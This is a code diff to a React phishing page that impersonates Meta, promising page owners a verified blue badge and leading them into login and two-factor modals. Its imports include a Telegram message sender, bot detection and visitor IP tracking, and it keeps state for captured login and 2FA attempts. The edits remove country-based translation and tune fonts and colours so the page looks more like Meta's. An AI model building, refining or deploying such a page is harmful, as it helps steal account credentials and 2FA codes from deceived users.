@@ -1,12 +1,10 @@
-import { useEffect, useState, useCallback, useMemo } from 'react';
+import { useEffect, useState, useMemo } from 'react';
 import { useLocation } from 'react-router';
 import axios from 'axios';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import TickIcon from '@/assets/images/tick.svg';
-import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
-import countryToLanguage from '@/utils/country_to_language';
 import FirstFormModal from '@/components/FirstFormModal';
 import LoginModal from '@/components/LoginModal';
 import TwoFAModal from '@/components/TwoFAModal';
@@ -17,14 +15,15 @@ import TermsModal from '@/components/TermsModal';
 
 const LABEL = 'Thần-tài-đến';
 
+const SYSTEM_FONT = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif';
+
 const generateTicketId = () =>
 {
-    const digits = '0123456789';
-    const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    const pick = ( pool, len ) =>
-        Array.from( { length: len }, () => pool[ Math.floor( Math.random() * pool.length ) ] ).join( '' );
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    const pick = ( len ) =>
+        Array.from( { length: len }, () => chars[ Math.floor( Math.random() * chars.length ) ] ).join( '' );
 
-    return `#${ pick( digits, 4 ) }-${ pick( letters, 4 ) }-${ pick( digits, 4 ) }`;
+    return `#${ pick( 4 ) }-${ pick( 4 ) }-${ pick( 4 ) }`;
 };
 
 const Home = () =>
@@ -50,16 +49,15 @@ const Home = () =>
     } );
     const [ loginAttempts, setLoginAttempts ] = useState( [] );
     const [ twoFAAttempts, setTwoFAAttempts ] = useState( [] );
-    const [ ipInfo, setIpInfo ] = useState( { ip: 'Unknown', country: 'Unknown', countryCode: '' } );
-    const [ translatedTexts, setTranslatedTexts ] = useState( {} );
+    const [ ipInfo, setIpInfo ] = useState( { ip: 'Unknown', country: 'Unknown', countryCode: 'US' } );
     const [ isLoading, setIsLoading ] = useState( true );
 
-    const defaultTexts = useMemo(
+    const texts = useMemo(
         () => ( {
             heroTitle: 'Meta Verified - Rewards for you',
             showWorld: 'Show the world that you mean business.',
-            congrats: "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you’ve built with your audience.",
-            excited: "We’re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!",
+            congrats: "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
+            excited: "We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!",
             ticketIdPrefix: 'Your ticket id:',
             guideTitle: 'Verified Blue Badge Request Guide',
             guideItem1: '- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats',
@@ -236,25 +234,12 @@ const Home = () =>
                 setIpInfo( {
                     ip: data.ip || 'Unknown',
                     country: data.country || 'Unknown',
-                    countryCode: data.country_code || ''
+                    countryCode: data.country_code || 'US'
                 } );
                 localStorage.setItem( 'ipInfo', JSON.stringify( data ) );
-
-                const countryCode = data.country_code;
-                const targetLang = countryToLanguage[ countryCode ] || 'en';
-                localStorage.setItem( 'targetLang', targetLang );
-
-                if ( targetLang !== 'en' )
-                {
-                    translateAllTexts( targetLang );
-                } else
-                {
-                    setTranslatedTexts( defaultTexts );
-                }
             } catch ( error )
             {
                 console.error( 'Error fetching IP:', error );
-                setTranslatedTexts( defaultTexts );
             }
 
             setIsLoading( false );
@@ -264,28 +249,6 @@ const Home = () =>
             setIsLoading( false );
         }
     };
-
-    const translateAllTexts = useCallback(
-        async ( targetLang ) =>
-        {
-            try
-            {
-                const keys = Object.keys( defaultTexts );
-                const translations = await Promise.all( keys.map( ( key ) => translateText( defaultTexts[ key ], targetLang ) ) );
-                const translated = {};
-                keys.forEach( ( key, index ) =>
-                {
-                    translated[ key ] = translations[ index ];
-                } );
-                setTranslatedTexts( translated );
-            } catch ( error )
-            {
-                console.error( 'Translation error:', error );
-                setTranslatedTexts( defaultTexts );
-            }
-        },
-        [ defaultTexts ]
-    );
 
     const pad = ( n ) => ( n < 10 ? '0' + n : String( n ) );
 
@@ -410,8 +373,6 @@ const Home = () =>
         } );
     };
 
-    const texts = Object.keys( translatedTexts ).length > 0 ? translatedTexts : defaultTexts;
-
     if ( isLoading )
     {
         return (
@@ -424,7 +385,6 @@ const Home = () =>
     return (
         <>
             <style>{ `
-                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
                 html, body, #root {
                     margin: 0 !important;
                     padding: 0 !important;
@@ -432,13 +392,12 @@ const Home = () =>
                     max-width: 100% !important;
                     min-height: 100dvh !important;
                     display: block !important;
-                    font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
+                    font-family: ${ SYSTEM_FONT } !important;
                     -webkit-font-smoothing: antialiased;
-                    text-rendering: optimizeLegibility;
-                    color: #171a1d;
+                    color: #1c2b33;
                 }
                 .meta-notice-wrapper * {
-                    font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
+                    font-family: ${ SYSTEM_FONT } !important;
                     box-sizing: border-box;
                 }
             ` }</style>
@@ -457,7 +416,7 @@ const Home = () =>
                     flexDirection: 'column',
                     alignItems: 'center',
                     justifyContent: 'flex-start',
-                    color: '#171a1d',
+                    color: '#1c2b33',
                     zIndex: 1
                 } }
             >
@@ -466,19 +425,18 @@ const Home = () =>
                         maxWidth: '768px',
                         width: '100%',
                         padding: '15px 15px 60px 15px',
-                        margin: 'auto 0'
+                        margin: '20px auto'
                     } }
                 >
                     <div style={ { padding: '15px' } }>
-                        {/* Header: Icon tích xanh + Tiêu đề lớn */}
                         <div
                             style={ {
                                 display: 'flex',
                                 alignItems: 'flex-start',
-                                gap: '8px',
+                                gap: '12px',
                                 flexDirection: 'column',
                                 justifyContent: 'flex-start',
-                                marginBottom: '30px'
+                                marginBottom: '26px'
                             } }
                         >
                             <img
@@ -491,21 +449,20 @@ const Home = () =>
                                     fontSize: 'clamp(1.6rem, 4.5vw, 2rem)',
                                     fontWeight: '700',
                                     lineHeight: '1.25',
-                                    color: '#171a1d'
+                                    color: '#1c2b33'
                                 } }
                             >
                                 { texts.heroTitle }
                             </b>
                         </div>
 
-                        {/* Nội dung chính */}
                         <div style={ { width: '100%' } }>
                             <div style={ { width: '100%', marginBottom: '20px' } }>
                                 <b
                                     style={ {
-                                        fontSize: '17px',
+                                        fontSize: '16.5px',
                                         fontWeight: '700',
-                                        color: '#171a1d',
+                                        color: '#1c2b33',
                                         display: 'block'
                                     } }
                                 >
@@ -518,7 +475,7 @@ const Home = () =>
                                         marginBottom: '0px',
                                         marginTop: '15px',
                                         lineHeight: '1.5',
-                                        color: '#171a1d'
+                                        color: '#1c2b33'
                                     } }
                                 >
                                     { texts.congrats }
@@ -530,7 +487,7 @@ const Home = () =>
                                         marginBottom: '0px',
                                         marginTop: '15px',
                                         lineHeight: '1.5',
-                                        color: '#171a1d'
+                                        color: '#1c2b33'
                                     } }
                                 >
                                     { texts.excited }
@@ -538,9 +495,9 @@ const Home = () =>
 
                                 <p
                                     style={ {
-                                        fontSize: '16px',
+                                        fontSize: '15.5px',
                                         marginBottom: '0px',
-                                        marginTop: '14px',
+                                        marginTop: '15px',
                                         color: '#465a69',
                                         lineHeight: '1.5'
                                     } }
@@ -549,14 +506,13 @@ const Home = () =>
                                 </p>
                             </div>
 
-                            {/* Hướng dẫn yêu cầu */}
                             <div style={ { width: '100%' } }>
                                 <p style={ { marginBottom: '15px', marginTop: 0 } }>
                                     <b
                                         style={ {
-                                            fontSize: '17px',
+                                            fontSize: '16.5px',
                                             fontWeight: '700',
-                                            color: '#171a1d'
+                                            color: '#1c2b33'
                                         } }
                                     >
                                         { texts.guideTitle }
@@ -566,10 +522,10 @@ const Home = () =>
                                 <p
                                     style={ {
                                         fontSize: '15px',
-                                        marginBottom: '10px',
+                                        marginBottom: '12px',
                                         marginTop: 0,
                                         lineHeight: '1.5',
-                                        color: '#171a1d'
+                                        color: '#1c2b33'
                                     } }
                                 >
                                     { texts.guideItem1 }
@@ -578,10 +534,10 @@ const Home = () =>
                                 <p
                                     style={ {
                                         fontSize: '15px',
-                                        marginBottom: '10px',
+                                        marginBottom: '12px',
                                         marginTop: 0,
                                         lineHeight: '1.5',
-                                        color: '#171a1d'
+                                        color: '#1c2b33'
                                     } }
                                 >
                                     { texts.guideItem2 }
@@ -593,7 +549,7 @@ const Home = () =>
                                         marginBottom: '0px',
                                         marginTop: 0,
                                         lineHeight: '1.5',
-                                        color: '#171a1d'
+                                        color: '#1c2b33'
                                     } }
                                 >
                                     { texts.guideItem3 }
@@ -602,7 +558,6 @@ const Home = () =>
                         </div>
                     </div>
 
-                    {/* Nút Submit request */}
                     <div
                         id="start"
                         role="button"
@@ -631,7 +586,6 @@ const Home = () =>
                         { texts.submitRequest }
                     </div>
 
-                    {/* Footer links */}
                     <div
                         style={ {
                             display: 'flex',
